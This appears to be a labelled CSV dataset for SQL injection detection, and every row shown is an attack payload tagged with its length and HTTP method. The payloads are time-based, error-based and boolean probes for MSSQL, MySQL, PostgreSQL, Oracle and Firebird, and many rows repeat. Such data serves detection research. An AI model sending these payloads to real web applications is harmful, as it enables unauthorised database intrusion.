sentence,attack_type,len_payload,http_method
  )  )    )  )    )  )   waitfor delay '0:0:20' --,1,48,POST
'  )  )    )  )    )  )   waitfor delay '0:0:20' --,1,51,POST
'  )  )    )  )    )  )   waitfor delay '0:0:20' /* ,1,51,POST
  )  )    )  )   )  waitfor delay '0:0:20' --,1,43,POST
'  )  )    )  )   )  waitfor delay '0:0:20' --,1,46,POST
'  )  )    )  )   )  waitfor delay '0:0:20' /* ,1,46,POST
"  )  )    )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --",1,61,POST
"'  )  )    )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --",1,64,POST
"  )  )    )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   %23",1,62,POST
"'  )  )    )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   %23",1,65,POST
"  )  )    )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*",1,61,POST
"'  )  )    )  )   and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*",1,64,POST
  )  )    )  )   waitfor delay '0:0:20' --,1,40,POST
'  )  )    )  )   waitfor delay '0:0:20' --,1,43,POST
  )  )    )  )   waitfor delay '0:0:20' /* ,1,40,POST
'  )  )    )  )   waitfor delay '0:0:20' /* ,1,43,POST
"'  )  )   )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (   ( 'dhco' = 'dhco",1,299,POST
"'  )  )   )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (   ( 'tZDZ' LIKE 'tZDZ",1,302,POST
"'  )  )   )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (   ( 'dhco' = 'dhco",1,299,POST
"'  )  )   )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (   ( 'tZDZ' LIKE 'tZDZ",1,302,POST
"  )  )   )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (   ( 5532 = 5532",1,293,POST
"  )  )   )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (   ( 5532 = 5532",1,293,POST
"  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --",1,56,POST
"'  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   --",1,59,POST
"  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   %23",1,57,POST
"'  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   %23",1,60,POST
"  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*",1,56,POST
"'  )  )   )  and 0 = benchmark ( 3000000,MD5 ( 1  )  )   /*",1,59,POST
'  )  )   )  AND 1305 = 1248-- AND   (  (   ( 'ViWt' LIKE 'ViWt,1,63,POST
'  )  )   )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'cKDx' = 'cKDx,1,294,POST
'  )  )   )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'fclk' LIKE 'fclk,1,297,POST
'  )  )   )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'cKDx' = 'cKDx,1,294,POST
'  )  )   )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'fclk' LIKE 'fclk,1,297,POST
  )  )   )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 7819 = 7819,1,288,POST
  )  )   )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 7819 = 7819,1,288,POST
  )  )   )  AND 2082 =  ( ':clz:'|| ( SELECT CASE 2082 WHEN 2082 THEN 1 ELSE 0 END FROM RDB$DATABASE ) ||':xid:' )  AND   (  (   ( 9223 = 9223,1,140,POST
'  )  )   )  AND 2082 =  ( ':clz:'|| ( SELECT CASE 2082 WHEN 2082 THEN 1 ELSE 0 END FROM RDB$DATABASE ) ||':xid:' )  AND   (  (   ( 'veki' = 'veki,1,146,POST
'  )  )   )  AND 2082 =  ( ':clz:'|| ( SELECT CASE 2082 WHEN 2082 THEN 1 ELSE 0 END FROM RDB$DATABASE ) ||':xid:' )  AND   (  (   ( 'VQRp' LIKE 'VQRp,1,149,POST
'  )  )   )  AND 2273 = 4910# AND   (  (   ( 'AthN' LIKE 'AthN,1,62,POST
'  )  )   )  AND 2474 = 1083# AND   (  (   ( 'ajQS' = 'ajQS,1,59,POST
  )  )   )  AND 2691 = 2691# AND   (  (   ( 7036 = 7036,1,53,POST
'  )  )   )  AND 2691 = 2691# AND   (  (   ( 'DExy' = 'DExy,1,59,POST
'  )  )   )  AND 2691 = 2691# AND   (  (   ( 'rCSx' LIKE 'rCSx,1,62,POST
  )  )   )  AND 3245 = 3156# AND   (  (   ( 7003 = 7003,1,53,POST
'  )  )   )  AND 3399 = 2610-- AND   (  (   ( 'TXfr' = 'TXfr,1,60,POST
'  )  )   )  AND 3587 = 1004-- AND   (  (   ( 'KFoW' = 'KFoW,1,60,POST
"  )  )   )  AND 4081 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 112 ) ||CHR ( 119 ) ||CHR ( 84 ) ||CHR ( 72 ) ,5 )  AND   (  (   ( 6513 = 6513",1,133,POST
"'  )  )   )  AND 4081 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 112 ) ||CHR ( 119 ) ||CHR ( 84 ) ||CHR ( 72 ) ,5 )  AND   (  (   ( 'XNLQ' LIKE 'XNLQ",1,142,POST
"'  )  )   )  AND 4081 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 112 ) ||CHR ( 119 ) ||CHR ( 84 ) ||CHR ( 72 ) ,5 )  AND   (  (   ( 'xsAP' = 'xsAP",1,139,POST
  )  )   )  AND 4301 =  ( SELECT 4301 FROM PG_SLEEP ( 5  )  )  -- AND   (  (   ( 9098,1,83,POST
  )  )   )  AND 4301 =  ( SELECT 4301 FROM PG_SLEEP ( 5  )  )  -- AND   (  (   ( 9098 = 9098,1,90,POST
'  )  )   )  AND 4301 =  ( SELECT 4301 FROM PG_SLEEP ( 5  )  )  -- AND   (  (   ( 'LdCk' = 'LdCk,1,96,POST
'  )  )   )  AND 4301 =  ( SELECT 4301 FROM PG_SLEEP ( 5  )  )  -- AND   (  (   ( 'oSUM' LIKE 'oSUM,1,99,POST
'  )  )   )  AND 4319 = 5374# AND   (  (   ( 'fYjS' LIKE 'fYjS,1,62,POST
'  )  )   )  AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND   (  (   ( 'vEwE' = 'vEwE,1,338,POST
'  )  )   )  AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND   (  (   ( 'qWFh' LIKE 'qWFh,1,341,POST
'  )  )   )  AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND   (  (   ( 'vEwE' = 'vEwE,1,338,POST
'  )  )   )  AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND   (  (   ( 'qWFh' LIKE 'qWFh,1,341,POST
  )  )   )  AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND   (  (   ( 2293 = 2293,1,332,POST
  )  )   )  AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND   (  (   ( 2293 = 2293,1,332,POST
  )  )   )  AND 4694 = 2332# AND   (  (   ( 4760 = 4760,1,53,POST
'  )  )   )  AND 6476 = 115 AND   (  (   ( 'tCfT' LIKE 'tCfT,1,60,POST
  )  )   )  AND 6695 = 6695-- AND   (  (   ( 8636 = 8636,1,54,GET
'  )  )   )  AND 6695 = 6695-- AND   (  (   ( 'hebG' LIKE 'hebG,1,63,GET
'  )  )   )  AND 6695 = 6695-- AND   (  (   ( 'KPwq' = 'KPwq,1,60,GET
'  )  )   )  AND 7025 = 7439 AND   (  (   ( 'wzOL' = 'wzOL,1,58,GET
"'  )  )   )  AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND   (  (   ( 'rWOl' = 'rWOl",1,299,GET
"'  )  )   )  AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND   (  (   ( 'MqjG' LIKE 'MqjG",1,302,GET
"'  )  )   )  AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND   (  (   ( 'rWOl' = 'rWOl",1,299,GET
"'  )  )   )  AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND   (  (   ( 'MqjG' LIKE 'MqjG",1,302,GET
"  )  )   )  AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND   (  (   ( 6261 = 6261",1,293,GET
"  )  )   )  AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND   (  (   ( 6261 = 6261",1,293,GET
  )  )   )  AND 7371 = 4214 AND   (  (   ( 6219 = 6219,1,52,GET
'  )  )   )  AND 7586 = 6671 AND   (  (   ( 'IJbl' LIKE 'IJbl,1,61,GET
'  )  )   )  AND 7767 = CAST ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7767 = 7767 )  THEN 1 ELSE 0 END  )  )  ::text||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 )  AS NUMERIC )  AND   (  (   ( 'ayUw' = 'ayUw,1,282,GET
'  )  )   )  AND 7767 = CAST ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7767 = 7767 )  THEN 1 ELSE 0 END  )  )  ::text||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 )  AS NUMERIC )  AND   (  (   ( 'VuGy' LIKE 'VuGy,1,285,GET
'  )  )   )  AND 7767 = CAST ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7767 = 7767 )  THEN 1 ELSE 0 END  )  )  ::text||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 )  AS NUMERIC )  AND   (  (   ( 'ayUw' = 'ayUw,1,282,GET
'  )  )   )  AND 7767 = CAST ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7767 = 7767 )  THEN 1 ELSE 0 END  )  )  ::text||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 )  AS NUMERIC )  AND   (  (   ( 'VuGy' LIKE 'VuGy,1,285,GET
  )  )   )  AND 7767 = CAST ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7767 = 7767 )  THEN 1 ELSE 0 END  )  )  ::text||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 )  AS NUMERIC )  AND   (  (   ( 7274 = 7274,1,276,GET
  )  )   )  AND 7767 = CAST ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7767 = 7767 )  THEN 1 ELSE 0 END  )  )  ::text||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 )  AS NUMERIC )  AND   (  (   ( 7274 = 7274,1,276,GET
  )  )   )  AND 8025 = 4290-- AND   (  (   ( 6935 = 6935,1,54,GET
"  )  )   )  AND 8214 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 98 ) ||CHR ( 105 ) ||CHR ( 106 ) ||CHR ( 71 ) ,5 ) -- AND   (  (   ( 5085 = 5085",1,135,POST
"'  )  )   )  AND 8214 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 98 ) ||CHR ( 105 ) ||CHR ( 106 ) ||CHR ( 71 ) ,5 ) -- AND   (  (   ( 'fdYW' LIKE 'fdYW",1,144,POST
"'  )  )   )  AND 8214 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 98 ) ||CHR ( 105 ) ||CHR ( 106 ) ||CHR ( 71 ) ,5 ) -- AND   (  (   ( 'YaZY' = 'YaZY",1,141,POST
'  )  )   )  AND 9119 = 8874-- AND   (  (   ( 'yqjx' LIKE 'yqjx,1,63,POST
'  )  )   )  AND 9217 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND   (  (   ( 'KGZB' = 'KGZB,1,298,POST
